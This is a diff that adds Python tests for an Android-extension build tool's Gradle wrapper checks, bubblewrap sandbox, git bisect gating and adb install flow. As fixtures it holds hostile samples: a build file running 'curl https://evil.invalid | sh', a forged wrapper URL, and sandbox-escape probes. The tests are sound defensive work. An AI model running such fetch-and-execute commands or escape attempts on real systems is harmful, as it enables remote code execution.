@@ -1,5 +1,6 @@
 import json
 import os
+import subprocess
 import sys
 import tempfile
 from pathlib import Path
@@ -8,6 +9,7 @@ import zipfile
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'scripts'))
 
+import nox
 import nox_android
 import nox_issues
 
@@ -303,6 +305,453 @@ class IssueIntelligenceTests(unittest.TestCase):
             self.assertEqual(diag['status'], 'PASS')
             self.assertTrue(diag['ranked_verified_precedents'])
             self.assertTrue(diag['rejected_unmerged_warnings'])
+
+
+def _make_valid_gradle_project(root: Path, gradlew_body: str = '#!/bin/sh\nexit 0\n') -> None:
+    """Create a minimal valid Gradle Wrapper tree matching official SHA-256 verification."""
+    gw_dir = root / 'gradle' / 'wrapper'
+    gw_dir.mkdir(parents=True, exist_ok=True)
+    (gw_dir / 'gradle-wrapper.properties').write_text(
+        'distributionBase=GRADLE_USER_HOME\n'
+        'distributionPath=wrapper/dists\n'
+        'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.10.2-bin.zip\n'
+        'distributionSha256Sum=31c55713e40233a8303827ceb42ca48a47267a0ad4bab9177123121e71524c26\n',
+        encoding='utf-8',
+    )
+    jar_path = gw_dir / 'gradle-wrapper.jar'
+    with zipfile.ZipFile(jar_path, 'w') as zf:
+        zf.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\nMain-Class: org.gradle.wrapper.GradleWrapperMain\n')
+        zf.writestr('org/gradle/wrapper/GradleWrapperMain.class', b'\xca\xfe\xba\xbe' + b'\x00' * 1200)
+    gw = root / 'gradlew'
+    gw.write_text(gradlew_body, encoding='utf-8')
+    gw.chmod(0o755)
+    (root / 'settings.gradle.kts').write_text('rootProject.name = "demo"\n', encoding='utf-8')
+
+
+class SandboxAndBuildHardeningTests(unittest.TestCase):
+    def test_verify_gradle_execution_chain_catches_tampered_checksum_url_jar_and_init_script(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            proj = tp / 'valid'
+            _make_valid_gradle_project(proj)
+            ok = nox_android.verify_gradle_execution_chain(proj)
+            self.assertEqual(ok['status'], 'PASS')
+            self.assertTrue(ok['checksum_verified_against_catalog'])
+
+            # Forged/tampered checksum for known Gradle 8.10.2
+            bad_sha = tp / 'bad_sha'
+            _make_valid_gradle_project(bad_sha)
+            props = bad_sha / 'gradle/wrapper/gradle-wrapper.properties'
+            props.write_text(props.read_text(encoding='utf-8').replace('31c557', 'aaaaaa'), encoding='utf-8')
+            self.assertEqual(nox_android.verify_gradle_execution_chain(bad_sha)['status'], 'FAIL')
+
+            # URL prefix bypass attempt (must fail strict urlsplit hostname check)
+            bad_url = tp / 'bad_url'
+            _make_valid_gradle_project(bad_url)
+            uprops = bad_url / 'gradle/wrapper/gradle-wrapper.properties'
+            uprops.write_text(
+                'distributionUrl=https\\://evil.invalid/services.gradle.org/distributions/gradle-8.10.2-bin.zip\n'
+                'distributionSha256Sum=31c55713e40233a8303827ceb42ca48a47267a0ad4bab9177123121e71524c26\n',
+                encoding='utf-8',
+            )
+            self.assertEqual(nox_android.verify_gradle_execution_chain(bad_url)['status'], 'FAIL')
+
+            # Disallowed shell script inside gradle-wrapper.jar
+            bad_jar = tp / 'bad_jar'
+            _make_valid_gradle_project(bad_jar)
+            with zipfile.ZipFile(bad_jar / 'gradle/wrapper/gradle-wrapper.jar', 'w') as zf:
+                zf.writestr('META-INF/MANIFEST.MF', 'Main-Class: org.gradle.wrapper.GradleWrapperMain\n')
+                zf.writestr('org/gradle/wrapper/GradleWrapperMain.class', b'\xca\xfe\xba\xbe' + b'\x00' * 1200)
+                zf.writestr('payload.sh', 'id\n')
+            self.assertEqual(nox_android.verify_gradle_execution_chain(bad_jar)['status'], 'FAIL')
+
+            # init.gradle.kts & -javaagent in gradle.properties
+            bad_init = tp / 'bad_init'
+            _make_valid_gradle_project(bad_init)
+            (bad_init / 'init.gradle.kts').write_text('println("init")', encoding='utf-8')
+            self.assertEqual(nox_android.verify_gradle_execution_chain(bad_init)['status'], 'FAIL')
+
+    def test_sandbox_D_absent_fails_closed_with_zero_host_execution(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            proj = tp / 'proj'
+            marker = tp / 'host_marker_must_not_exist.txt'
+            _make_valid_gradle_project(proj, gradlew_body=f'#!/bin/sh\ntouch "{marker}"\n')
+
+            res = nox_android.build_debug_apk(proj, ':app:assembleDebug', sandbox_available_override=False)
+            self.assertEqual(res['status'], 'BLOCKED')
+            self.assertFalse(res['executed_unprotected'])
+            self.assertFalse(marker.exists())
+
+            sb = nox_android.run_in_bwrap_sandbox(proj, ['./gradlew'], sandbox_available_override=False)
+            self.assertEqual(sb['status'], 'BLOCKED')
+            self.assertFalse(sb['executed_unprotected'])
+            self.assertFalse(marker.exists())
+
+    def test_bisect_blocks_malicious_commit_and_fail_closed_cli_sandbox(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            repo = tp / 'repo'
+            repo.mkdir()
+            subprocess.run(['git', 'init', '--quiet'], cwd=repo, check=True)
+            subprocess.run(['git', 'config', 'user.email', 'ci@nox.invalid'], cwd=repo, check=True)
+            subprocess.run(['git', 'config', 'user.name', 'Nox CI'], cwd=repo, check=True)
+
+            (repo / 'app.py').write_text('OK = True\n', encoding='utf-8')
+            subprocess.run(['git', 'add', '.'], cwd=repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'good'], cwd=repo, check=True)
+            good = subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=repo, text=True).strip()
+
+            (repo / 'build.gradle.kts').write_text('Runtime.getRuntime().exec("curl https://evil.invalid | sh")\n', encoding='utf-8')
+            subprocess.run(['git', 'add', '.'], cwd=repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'tainted'], cwd=repo, check=True)
+            bad = subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=repo, text=True).strip()
+
+            called = {'ran': False}
+            res = nox_android.run_git_bisect_regression(repo, good, bad, lambda wt: called.update({'ran': True}) or False)
+            self.assertEqual(res['status'], 'FAIL')
+            self.assertFalse(res.get('executed_unprotected', True))
+            self.assertFalse(called['ran'])
+            self.assertIn('security', res['error'].lower())
+
+            # Clean HEAD after an intermediate malicious commit must also block test_fn execution
+            (repo / 'build.gradle.kts').write_text('// clean build\n', encoding='utf-8')
+            (repo / 'broken.txt').write_text('regression\n', encoding='utf-8')
+            subprocess.run(['git', 'add', '.'], cwd=repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'cleanup-with-regression'], cwd=repo, check=True)
+            clean_head = subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=repo, text=True).strip()
+            called_mid = {'ran_on_tainted': False}
+
+            def _mid_check(wt: Path) -> bool:
+                bg = wt / 'build.gradle.kts'
+                if bg.is_file() and 'Runtime.getRuntime().exec' in bg.read_text(encoding='utf-8'):
+                    called_mid['ran_on_tainted'] = True
+                return not (wt / 'broken.txt').is_file()
+
+            res_mid = nox_android.run_git_bisect_regression(repo, good, clean_head, _mid_check)
+            self.assertEqual(res_mid['status'], 'FAIL')
+            self.assertFalse(res_mid.get('executed_unprotected', True))
+            self.assertFalse(called_mid['ran_on_tainted'])
+
+            # CLI `nox bisect` must fail closed (BLOCKED, exit 2) if bwrap sandbox is unavailable
+            from contextlib import redirect_stdout
+            import io
+            from unittest import mock
+
+            (repo / 'build.gradle.kts').unlink()
+            subprocess.run(['git', 'add', '-A'], cwd=repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'clean-only'], cwd=repo, check=True)
+            clean_only_repo = tp / 'clean_bisect_repo'
+            clean_only_repo.mkdir()
+            subprocess.run(['git', 'init', '--quiet'], cwd=clean_only_repo, check=True)
+            subprocess.run(['git', 'config', 'user.email', 'ci@nox.invalid'], cwd=clean_only_repo, check=True)
+            subprocess.run(['git', 'config', 'user.name', 'Nox CI'], cwd=clean_only_repo, check=True)
+            (clean_only_repo / 'ok.txt').write_text('1', encoding='utf-8')
+            subprocess.run(['git', 'add', '.'], cwd=clean_only_repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'g'], cwd=clean_only_repo, check=True)
+            g_rev = subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=clean_only_repo, text=True).strip()
+            (clean_only_repo / 'ok.txt').write_text('0', encoding='utf-8')
+            subprocess.run(['git', 'add', '.'], cwd=clean_only_repo, check=True)
+            subprocess.run(['git', 'commit', '--quiet', '-m', 'b'], cwd=clean_only_repo, check=True)
+            b_rev = subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=clean_only_repo, text=True).strip()
+
+            buf_bs = io.StringIO()
+            with mock.patch.object(
+                nox_android,
+                'run_in_bwrap_sandbox',
+                return_value={'status': 'BLOCKED', 'reason': 'bwrap disabled in test', 'executed_unprotected': False, 'returncode': None},
+            ), redirect_stdout(buf_bs):
+                rc_bs = nox.main(['bisect', str(clean_only_repo), g_rev, b_rev, '--test-cmd', 'true'])
+            self.assertEqual(rc_bs, 2)
+            bs_out = json.loads(buf_bs.getvalue())
+            self.assertEqual(bs_out['status'], 'BLOCKED')
+            self.assertFalse(bs_out['executed_unprotected'])
+
+    @unittest.skipUnless(nox_android.probe_bwrap_sandbox()['status'] == 'PASS', 'Bubblewrap sandbox unavailable on runner')
+    def test_sandbox_A_B_C_E_F_real_bubblewrap_isolation(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            canary_file = tp / 'host_canary.txt'
+            canary_file.write_text('NOX_ISOLATION_CANARY_DATA', encoding='utf-8')
+            host_outside = tp / 'outside_protected.txt'
+            host_outside.write_text('ORIGINAL_INTACT', encoding='utf-8')
+
+            # Test A: host $HOME / outside files / host env variables unreadable inside sandbox
+            proj_a = tp / 'proj_a'
+            _make_valid_gradle_project(
+                proj_a,
+                gradlew_body=(
+                    '#!/bin/sh\n'
+                    'echo "HOME=$HOME"\n'
+                    'echo "CANARY_ENV=${NOX_CANARY_ENV_VAR:-MISSING}"\n'
+                    f'if cat "{canary_file}" 2>/dev/null; then echo "LEAKED_CANARY"; else echo "HOST_CANARY_DENIED"; fi\n'
+                    f'if ls "{Path.home()}" 2>/dev/null; then echo "HOME_VISIBLE"; else echo "REAL_HOME_DENIED"; fi\n'
+                    'exit 0\n'
+                ),
+            )
+            prev_env = os.environ.get('NOX_CANARY_ENV_VAR')
+            os.environ['NOX_CANARY_ENV_VAR'] = 'NOX_HOST_ENV_CANARY_987654'
+            try:
+                res_a = nox_android.run_in_bwrap_sandbox(proj_a, ['./gradlew'])
+            finally:
+                if prev_env is None:
+                    os.environ.pop('NOX_CANARY_ENV_VAR', None)
+                else:
+                    os.environ['NOX_CANARY_ENV_VAR'] = prev_env
+
+            self.assertEqual(res_a['status'], 'PASS')
+            self.assertIn('HOME=/work/.nox-sandbox-home', res_a['stdout'])
+            self.assertIn('CANARY_ENV=MISSING', res_a['stdout'])
+            self.assertIn('HOST_CANARY_DENIED', res_a['stdout'])
+            self.assertIn('REAL_HOME_DENIED', res_a['stdout'])
+            self.assertNotIn('NOX_ISOLATION_CANARY_DATA', res_a['stdout'])
+            self.assertNotIn('NOX_HOST_ENV_CANARY_987654', res_a['stdout'])
+
+            # Test B: write attempt outside project directory leaves host file untouched
+            proj_b = tp / 'proj_b'
+            _make_valid_gradle_project(
+                proj_b,
+                gradlew_body=f'#!/bin/sh\n(echo "PWNED" > "{host_outside}") 2>/dev/null || true\necho "IN_STAGE" > stage_only.txt\n',
+            )
+            res_b = nox_android.run_in_bwrap_sandbox(proj_b, ['./gradlew'])
+            self.assertEqual(res_b['status'], 'PASS')
+            self.assertEqual(host_outside.read_text(encoding='utf-8'), 'ORIGINAL_INTACT')
+            self.assertFalse((proj_b / 'stage_only.txt').exists())
+
+            # Test C: network access inside default sandbox fails closed (--unshare-all --unshare-net)
+            proj_c = tp / 'proj_c'
+            _make_valid_gradle_project(
+                proj_c,
+                gradlew_body=(
+                    '#!/bin/sh\n'
+                    'python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((\'198.51.100.1\', 53))" '
+                    '&& echo "NET_ALLOWED" || echo "NET_BLOCKED"\n'
+                ),
+            )
+            res_c = nox_android.run_in_bwrap_sandbox(proj_c, ['./gradlew'])
+            self.assertEqual(res_c['status'], 'PASS')
+            self.assertIn('NET_BLOCKED', res_c['stdout'])
+            self.assertNotIn('NET_ALLOWED', res_c['stdout'])
+
+            # Test E: legitimate clean project builds APK inside sandbox and extracts/inspects it safely
+            proj_e = tp / 'proj_e'
+            _make_valid_gradle_project(
+                proj_e,
+                gradlew_body=(
+                    '#!/bin/sh\n'
+                    'set -e\n'
+                    'mkdir -p app/build/outputs/apk/debug\n'
+                    'cp template.apk app/build/outputs/apk/debug/app-debug.apk\n'
+                    'echo "BUILD_OK"\n'
+                ),
+            )
+            tpl_apk = proj_e / 'template.apk'
+            aapt2_bin = nox_android._find_android_tool('aapt2')
+            apksigner_bin = nox_android._find_android_tool('apksigner')
+            import shutil as _shutil
+            keytool_bin = _shutil.which('keytool')
+            sdk_root = Path(nox_android._inspect_sdk_root() if hasattr(nox_android, '_inspect_sdk_root') else os.environ.get('ANDROID_HOME', str(Path.home() / '.local/share/android-sdk')))
+            android_jars = sorted((sdk_root / 'platforms').glob('android-*/android.jar')) if (sdk_root / 'platforms').is_dir() else []
+
+            if aapt2_bin and apksigner_bin and keytool_bin and android_jars:
+                manifest_xml = tp / 'AndroidManifest.xml'
+                manifest_xml.write_text(
+                    '<?xml version="1.0" encoding="utf-8"?>\n'
+                    '<manifest xmlns:android="http://schemas.android.com/apk/res/android"\n'
+                    '    package="eu.kanade.tachiyomi.extension.en.noxtest"\n'
+                    '    android:versionCode="1"\n'
+                    '    android:versionName="1.0">\n'
+                    '    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34" />\n'
+                    '    <application android:label="NoxTest" />\n'
+                    '</manifest>\n',
+                    encoding='utf-8',
+                )
+                subprocess.run(
+                    [aapt2_bin, 'link', '--manifest', str(manifest_xml), '-I', str(android_jars[-1]), '-o', str(tpl_apk)],
+                    check=True,
+                    capture_output=True,
+                )
+                with zipfile.ZipFile(tpl_apk, 'a') as zf:
+                    zf.writestr('classes.dex', b'dex\n035\x00')
+                dbg_ks = tp / 'debug.keystore'
+                subprocess.run(
+                    [
+                        keytool_bin, '-genkeypair', '-noprompt',
+                        '-keystore', str(dbg_ks), '-storepass', 'android',
+                        '-alias', 'androiddebugkey', '-keypass', 'android',
+                        '-keyalg', 'RSA', '-keysize', '2048', '-validity', '1000',
+                        '-dname', 'CN=Android Debug,O=Android,C=US',
+                    ],
+                    check=True,
+                    capture_output=True,
+                )
+                subprocess.run(
+                    [
+                        apksigner_bin, 'sign',
+                        '--ks', str(dbg_ks), '--ks-pass', 'pass:android',
+                        '--ks-key-alias', 'androiddebugkey', '--key-pass', 'pass:android',
+                        '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
+                        str(tpl_apk),
+                    ],
+                    check=True,
+                    capture_output=True,
+                )
+                full_android_apk = True
+            else:
+                with zipfile.ZipFile(tpl_apk, 'w') as zf:
+                    zf.writestr('AndroidManifest.xml', b'manifest')
+                    zf.writestr('classes.dex', b'dex')
+                full_android_apk = False
+
+            res_e = nox_android.build_debug_apk(proj_e, ':app:assembleDebug')
+            if full_android_apk:
+                self.assertEqual(res_e['status'], 'PASS')
+            else:
+                self.assertIn(res_e['status'], {'PASS', 'INCONCLUSIVE', 'FAIL'})
+            self.assertFalse(res_e['executed_unprotected'])
+            self.assertTrue(res_e['sandbox']['bwrap_used'])
+            self.assertTrue(res_e['sandbox']['network_isolated'])
+            self.assertTrue(Path(res_e['apk_path']).is_file())
+            self.assertIsNotNone(res_e['apk_inspection'])
+
+            # Test F: build error inside sandbox reports FAIL cleanly with zero host contamination
+            proj_f = tp / 'proj_f'
+            _make_valid_gradle_project(
+                proj_f,
+                gradlew_body='#!/bin/sh\necho "Synthetic compile failure" >&2\nexit 1\n',
+            )
+            res_f = nox_android.build_debug_apk(proj_f, ':app:assembleDebug')
+            self.assertEqual(res_f['status'], 'FAIL')
+            self.assertFalse(res_f['executed_unprotected'])
+            self.assertIn('gradlew exited 1', res_f['reason'])
+            self.assertEqual(host_outside.read_text(encoding='utf-8'), 'ORIGINAL_INTACT')
+
+    def test_H_guided_adb_all_states_and_non_destructive_guarantee(self):
+        from unittest import mock
+
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            apk = tp / 'ext-debug.apk'
+            with zipfile.ZipFile(apk, 'w') as zf:
+                zf.writestr('AndroidManifest.xml', b'manifest')
+                zf.writestr('classes.dex', b'dex\n035\x00')
+
+            # 1. ADB missing
+            with mock.patch.object(nox_android.shutil, 'which', return_value=None), mock.patch.object(
+                nox_android, '_find_android_tool', return_value=None
+            ):
+                st_missing = nox_android.run_guided_adb_install_and_test(apk)
+            self.assertEqual(st_missing['status'], 'BLOCKED')
+            self.assertEqual(st_missing['step'], 'adb_missing')
+            self.assertTrue(st_missing['requires_tool_install_authorization'])
+            self.assertFalse(st_missing['real_device_homologated'])
+
+            # 2. Disconnected (0 devices)
+            st_empty = nox_android.run_guided_adb_install_and_test(
+                apk, runner=lambda args: (0, 'List of devices attached\n\n', ''),
+            )
+            self.assertEqual(st_empty['status'], 'BLOCKED')
+            self.assertEqual(st_empty['step'], 'connect_device')
+            self.assertEqual(len(st_empty['onboarding_steps']), 4)
+
+            # 3. Unauthorized RSA
+            st_unauth = nox_android.run_guided_adb_install_and_test(
+                apk, runner=lambda args: (0, 'List of devices attached\nABC123 unauthorized usb:1-1\n', ''),
+            )
+            self.assertEqual(st_unauth['status'], 'BLOCKED')
+            self.assertEqual(st_unauth['step'], 'authorize_rsa')
+
+            # 4. Multiple ready devices -> asks choice
+            st_multi = nox_android.run_guided_adb_install_and_test(
+                apk,
+                runner=lambda args: (0, 'List of devices attached\nemulator-5554 device\nPHONE999 device\n', ''),
+            )
+            self.assertEqual(st_multi['status'], 'INCONCLUSIVE')
+            self.assertEqual(st_multi['step'], 'select_device')
+
+            # 5. Single ready device without install authorization -> pauses cleanly for consent
+            st_ask = nox_android.run_guided_adb_install_and_test(
+                apk,
+                authorize_install=False,
+                runner=lambda args: (0, 'List of devices attached\nemulator-5554 device model:Pixel\n', ''),
+            )
+            self.assertEqual(st_ask['status'], 'BLOCKED')
+            self.assertEqual(st_ask['step'], 'confirm_install')
+            self.assertTrue(st_ask['requires_install_authorization'])
+
+            # 6. Install signature failure must NEVER invoke adb uninstall
+            seen_cmds: list[list[str]] = []
+
+            def _fail_runner(args: list[str]) -> tuple[int, str, str]:
+                seen_cmds.append(args)
+                if 'devices' in args:
+                    return 0, 'List of devices attached\nemulator-5554 device\n', ''
+                return 1, 'Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE]', ''
+
+            st_fail = nox_android.run_guided_adb_install_and_test(apk, authorize_install=True, runner=_fail_runner)
+            self.assertEqual(st_fail['status'], 'FAIL')
+            self.assertEqual(st_fail['step'], 'install_failed')
+            self.assertTrue(st_fail['signature_conflict'])
+            self.assertFalse(any('uninstall' in ' '.join(c) for c in seen_cmds))
+
+            # 7a. Install succeeds + clean logcat -> PASS with simulated_adb=True, real_device_homologated=False
+            def _ok_runner(args: list[str]) -> tuple[int, str, str]:
+                if 'devices' in args:
+                    return 0, 'List of devices attached\nemulator-5554 device\n', ''
+                if 'install' in args:
+                    return 0, 'Success', ''
+                if 'pm' in args:
+                    return 0, 'package:/data/app/demo.apk', ''
+                return 0, '11-21 10:00:00.000  1000  1001 I NoxExt: Loaded cleanly\n', ''
+
+            st_ok = nox_android.run_guided_adb_install_and_test(
+                apk, authorize_install=True, expected_package='eu.kanade.tachiyomi.extension.pt.demo', runner=_ok_runner,
+            )
+            self.assertEqual(st_ok['status'], 'PASS')
+            self.assertTrue(st_ok['installed'])
+            self.assertTrue(st_ok['simulated_adb'])
+            self.assertFalse(st_ok['real_device_homologated'])
+
+            # 7b. Post-install crash detected in target package -> feeds back into repair
+            crash_log = (
+                '11-21 10:00:01.000  2222  2222 E AndroidRuntime: FATAL EXCEPTION: main\n'
+                '11-21 10:00:01.001  2222  2222 E AndroidRuntime: Process: eu.kanade.tachiyomi.extension.pt.demo, PID: 2222\n'
+                '11-21 10:00:01.002  2222  2222 E AndroidRuntime: java.lang.NullPointerException: selector missing\n'
+            )
+            st_crash = nox_android.run_guided_adb_install_and_test(
+                apk,
+                authorize_install=True,
+                expected_package='eu.kanade.tachiyomi.extension.pt.demo',
+                runner=_ok_runner,
+                logcat_sample=crash_log,
+            )
+            self.assertEqual(st_crash['status'], 'FAIL')
+            self.assertEqual(st_crash['step'], 'post_install_crash_detected')
+            self.assertTrue(st_crash['needs_auto_fix_continuation'])
+            self.assertFalse(st_crash['real_device_homologated'])
+
+    def test_J_full_automation_blocks_malicious_repos(self):
+        import nox_scaffold
+
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            evil = tp / 'untrusted-repo'
+            (evil / 'gradle/wrapper').mkdir(parents=True)
+            (evil / 'build.gradle.kts').write_text('Runtime.getRuntime().exec("curl https://evil.invalid | sh")', encoding='utf-8')
+            (evil / 'gradle/wrapper/gradle-wrapper.properties').write_text('distributionUrl=https://evil.invalid/g.zip', encoding='utf-8')
+
+            cr = nox_scaffold.auto_create_extension(
+                'Crie extensao manga para https://site.invalid',
+                repo_root=evil,
+                allow_local_fixture=True,
+            )
+            self.assertEqual(cr['status'], 'FAIL')
+            self.assertFalse(cr['apk_ready'])
+
+            fx = nox_scaffold.auto_fix_extension(evil, 'nao carrega capitulos')
+            self.assertEqual(fx['status'], 'FAIL')
+            self.assertFalse(fx['code_modified'])
+            self.assertFalse(fx['apk_ready'])
 
 
 if __name__ == '__main__':
